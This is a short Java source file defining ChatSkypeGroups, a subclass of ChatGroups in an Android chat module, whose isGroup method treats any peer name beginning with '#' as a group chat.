package com.android.networking.module.chat;

public class ChatSkypeGroups extends ChatGroups {

	@Override
	boolean isGroup(String peer) {
		
		return peer.startsWith("#");
	}

}
